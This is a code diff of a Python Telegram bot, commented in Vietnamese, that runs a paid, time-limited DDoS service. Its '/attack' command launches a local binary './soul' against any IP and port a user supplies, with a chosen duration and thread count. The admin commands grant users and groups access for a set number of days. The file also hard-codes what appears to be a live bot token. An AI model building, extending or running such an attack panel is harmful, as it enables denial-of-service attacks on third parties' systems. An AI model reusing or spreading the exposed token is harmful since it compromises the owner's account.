@@ -2,157 +2,168 @@ import telebot
 import subprocess
 import threading
 import psutil
-import time
 import os
+import time
 from datetime import datetime, timedelta
 
-TOKEN = "7656031517:AAFSYcm8x17xafPqA1d9Gl0u-znGVnjkkFU"
-ADMIN_ID = 7088683094  # Thay bằng ID admin của bạn
-USER_FILE = "users.txt"
-GROUP_FILE = "groups.txt"
-
+# Cấu hình bot
+TOKEN = "7656031517:AAFSYcm8x17xafPqA1d9Gl0u-znGVnjkkFU"  # Thay thế bằng Token của bạn
+ADMIN_ID = 7088683094      # ID Admin (người duy nhất có quyền thêm user/group)
 bot = telebot.TeleBot(TOKEN)
 
-running_attacks = {}
+# Biến lưu user/group được phép sử dụng
 allowed_users = {}  # {user_id: expiry_date}
 allowed_groups = {}  # {group_id: expiry_date}
-last_attack_time = {}  # {user_id: last_attack_time}
-ATTACK_COOLDOWN = 120  # Giới hạn 2 phút (120 giây) / lần attack
-DEFAULT_THREADS = "100"  # Số luồng mặc định
+running_attacks = {}
 
-# 📌 Load dữ liệu từ file khi bot khởi động
+# Hàm đọc dữ liệu từ file khi khởi động bot
 def load_data():
-    if os.path.exists(USER_FILE):
-        with open(USER_FILE, "r") as f:
+    global allowed_users, allowed_groups
+    allowed_users.clear()
+    allowed_groups.clear()
+
+    if os.path.exists("users.txt"):
+        with open("users.txt", "r") as f:
             for line in f:
                 user_id, expiry_date = line.strip().split(",")
                 allowed_users[int(user_id)] = datetime.strptime(expiry_date, "%Y-%m-%d %H:%M:%S")
 
-    if os.path.exists(GROUP_FILE):
-        with open(GROUP_FILE, "r") as f:
+    if os.path.exists("groups.txt"):
+        with open("groups.txt", "r") as f:
             for line in f:
                 group_id, expiry_date = line.strip().split(",")
                 allowed_groups[int(group_id)] = datetime.strptime(expiry_date, "%Y-%m-%d %H:%M:%S")
 
-# 📌 Lưu dữ liệu vào file
+# Hàm lưu user/group vào file
 def save_data():
-    with open(USER_FILE, "w") as f:
+    with open("users.txt", "w") as f:
         for user_id, expiry_date in allowed_users.items():
             f.write(f"{user_id},{expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n")
 
-    with open(GROUP_FILE, "w") as f:
+    with open("groups.txt", "w") as f:
         for group_id, expiry_date in allowed_groups.items():
             f.write(f"{group_id},{expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n")
 
-# 📌 Xóa user/group hết hạn
-def check_expired_access():
-    current_time = datetime.now()
-    expired_users = [user for user, exp in allowed_users.items() if exp < current_time]
-    expired_groups = [group for group, exp in allowed_groups.items() if exp < current_time]
+# Hàm kiểm tra & xóa user/group hết hạn
+def remove_expired():
+    now = datetime.now()
+    expired_users = [uid for uid, exp in allowed_users.items() if exp < now]
+    expired_groups = [gid for gid, exp in allowed_groups.items() if exp < now]
 
-    for user in expired_users:
-        del allowed_users[user]
-    
-    for group in expired_groups:
-        del allowed_groups[group]
+    for uid in expired_users:
+        del allowed_users[uid]
+    for gid in expired_groups:
+        del allowed_groups[gid]
 
-    save_data()  # Cập nhật file
+    save_data()
 
-# ✅ Lệnh thêm user vào danh sách có thời hạn
+# Chạy kiểm tra mỗi 10 phút
+def start_cleaner():
+    while True:
+        remove_expired()
+        time.sleep(600)  # Kiểm tra mỗi 10 phút
+
+threading.Thread(target=start_cleaner, daemon=True).start()
+load_data()  # Load dữ liệu khi bot khởi động
+
+# Kiểm tra quyền user/group
+def is_allowed(user_id, chat_id):
+    return user_id in allowed_users or chat_id in allowed_groups
+
+# Lệnh thêm user
 @bot.message_handler(commands=['add_user'])
 def add_user(message):
     if message.chat.id != ADMIN_ID:
-        return bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này.")
-
+        return
     args = message.text.split()
     if len(args) != 3:
-        return bot.send_message(message.chat.id, "❌ Hãy nhập đúng định dạng: /add_user <user_id> <số ngày>")
+        bot.send_message(ADMIN_ID, "❌ Định dạng: /add_user <user_id> <số ngày>")
+        return
+    
+    user_id, days = int(args[1]), int(args[2])
+    expiry_date = datetime.now() + timedelta(days=days)
+    allowed_users[user_id] = expiry_date
+    save_data()
+    bot.send_message(ADMIN_ID, f"✅ Đã thêm user {user_id} trong {days} ngày!")
 
-    try:
-        user_id = int(args[1])
-        days = int(args[2])
-        expiry_date = datetime.now() + timedelta(days=days)
-        allowed_users[user_id] = expiry_date
-        save_data()
-        bot.send_message(message.chat.id, f"✅ Người dùng `{user_id}` được cấp quyền sử dụng bot trong `{days}` ngày.", parse_mode="Markdown")
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ Lỗi! Hãy nhập đúng định dạng.")
-
-# ❌ Lệnh xóa user khỏi danh sách
-@bot.message_handler(commands=['remove_user'])
-def remove_user(message):
-    if message.chat.id != ADMIN_ID:
-        return bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này.")
-
-    args = message.text.split()
-    if len(args) != 2:
-        return bot.send_message(message.chat.id, "❌ Hãy nhập đúng định dạng: /remove_user <user_id>")
-
-    try:
-        user_id = int(args[1])
-        if user_id in allowed_users:
-            del allowed_users[user_id]
-            save_data()
-            bot.send_message(message.chat.id, f"✅ Người dùng `{user_id}` đã bị xóa khỏi danh sách sử dụng bot.", parse_mode="Markdown")
-        else:
-            bot.send_message(message.chat.id, "❌ Người dùng này không có trong danh sách.")
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ Lỗi! Hãy nhập đúng định dạng.")
-
-# ✅ Lệnh thêm group vào danh sách có thời hạn
+# Lệnh thêm group
 @bot.message_handler(commands=['add_group'])
 def add_group(message):
     if message.chat.id != ADMIN_ID:
-        return bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này.")
-
+        return
     args = message.text.split()
     if len(args) != 3:
-        return bot.send_message(message.chat.id, "❌ Hãy nhập đúng định dạng: /add_group <group_id> <số ngày>")
+        bot.send_message(ADMIN_ID, "❌ Định dạng: /add_group <group_id> <số ngày>")
+        return
+    
+    group_id, days = int(args[1]), int(args[2])
+    expiry_date = datetime.now() + timedelta(days=days)
+    allowed_groups[group_id] = expiry_date
+    save_data()
+    bot.send_message(ADMIN_ID, f"✅ Đã thêm group {group_id} trong {days} ngày!")
 
-    try:
-        group_id = int(args[1])
-        days = int(args[2])
-        expiry_date = datetime.now() + timedelta(days=days)
-        allowed_groups[group_id] = expiry_date
-        save_data()
-        bot.send_message(message.chat.id, f"✅ Nhóm `{group_id}` được cấp quyền sử dụng bot trong `{days}` ngày.", parse_mode="Markdown")
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ Lỗi! Hãy nhập đúng định dạng.")
-
-# ❌ Lệnh xóa group khỏi danh sách
-@bot.message_handler(commands=['remove_group'])
-def remove_group(message):
+# Lệnh kiểm tra danh sách user
+@bot.message_handler(commands=['list_users'])
+def list_users(message):
     if message.chat.id != ADMIN_ID:
-        return bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này.")
+        return
+    users = "\n".join([f"🔹 {uid} (Hết hạn: {exp.strftime('%Y-%m-%d %H:%M:%S')})" for uid, exp in allowed_users.items()])
+    bot.send_message(ADMIN_ID, f"📋 **Danh sách Users:**\n{users}" if users else "❌ Không có user nào!")
+
+# Lệnh kiểm tra danh sách group
+@bot.message_handler(commands=['list_groups'])
+def list_groups(message):
+    if message.chat.id != ADMIN_ID:
+        return
+    groups = "\n".join([f"🔹 {gid} (Hết hạn: {exp.strftime('%Y-%m-%d %H:%M:%S')})" for gid, exp in allowed_groups.items()])
+    bot.send_message(ADMIN_ID, f"📋 **Danh sách Groups:**\n{groups}" if groups else "❌ Không có group nào!")
+
+# Lệnh attack
+@bot.message_handler(commands=['attack'])
+def run_command(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    if not is_allowed(user_id, chat_id):
+        bot.send_message(chat_id, "❌ Bạn không có quyền sử dụng lệnh này!")
+        return
 
     args = message.text.split()
-    if len(args) != 2:
-        return bot.send_message(message.chat.id, "❌ Hãy nhập đúng định dạng: /remove_group <group_id>")
-
+    if len(args) != 5:
+        bot.send_message(chat_id, "❌ Định dạng: /attack <IP> <port> <time> <threads>")
+        return
+    
+    ip, port, duration, threads = args[1], args[2], args[3], args[4]
     try:
-        group_id = int(args[1])
-        if group_id in allowed_groups:
-            del allowed_groups[group_id]
-            save_data()
-            bot.send_message(message.chat.id, f"✅ Nhóm `{group_id}` đã bị xóa khỏi danh sách sử dụng bot.", parse_mode="Markdown")
-        else:
-            bot.send_message(message.chat.id, "❌ Nhóm này không có trong danh sách.")
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ Lỗi! Hãy nhập đúng định dạng.")
+        process = subprocess.Popen(["./soul", ip, port, duration, threads], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        running_attacks[process.pid] = process
+        bot.send_message(chat_id, f"🚀 **Tấn công đã bắt đầu!**\n🔹 IP: `{ip}`\n🔹 Port: `{port}`\n🔹 Thời gian: `{duration}` giây\n🔹 Luồng: `{threads}`", parse_mode="Markdown")
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Lỗi khi chạy attack: {str(e)}")
 
-# 🚀 Chạy bot
-def main():
-    load_data()  # Load dữ liệu khi khởi động bot
-    bot.send_message(ADMIN_ID, "🤖 **Bot đã khởi động!**")
-    bot.polling()
+# Lệnh status
+@bot.message_handler(commands=['status'])
+def check_status(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    if not is_allowed(user_id, chat_id):
+        bot.send_message(chat_id, "❌ Bạn không có quyền sử dụng lệnh này!")
+        return
 
+    cpu_usage = psutil.cpu_percent(interval=1)
+    ram_usage = psutil.virtual_memory().percent
+    uptime = time.time() - psutil.boot_time()
+    uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
+
+    status_message = (f"📊 **Trạng thái hệ thống**\n"
+                      f"🔹 CPU: {cpu_usage}%\n"
+                      f"🔹 RAM: {ram_usage}%\n"
+                      f"🔹 Uptime: {uptime_str}")
+    bot.send_message(chat_id, status_message)
+
+# Chạy bot
 while True:
     try:
         bot.polling(none_stop=True, timeout=60)
     except Exception as e:
-        print(f"Lỗi xảy ra: {e}")
+        print(f"Lỗi: {e}")
         time.sleep(5)
-
-if __name__ == "__main__":
-    main()
-                
